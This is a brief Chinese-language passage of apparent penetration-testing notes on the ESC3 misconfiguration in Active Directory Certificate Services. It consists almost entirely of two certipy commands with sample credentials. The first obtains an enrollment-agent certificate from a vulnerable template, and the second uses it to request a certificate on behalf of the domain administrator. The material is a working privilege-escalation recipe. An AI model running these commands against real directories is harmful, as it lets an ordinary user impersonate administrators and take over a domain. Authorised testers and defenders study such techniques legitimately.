	根据易受攻击的证书模板 ESC3 请求证书。
	>certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC3'
	[*] Saved certificate and private key to 'john.pfx'
	使用证书请求代理证书 (-pfx) 代表其他其他用户请求证书
	>certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'
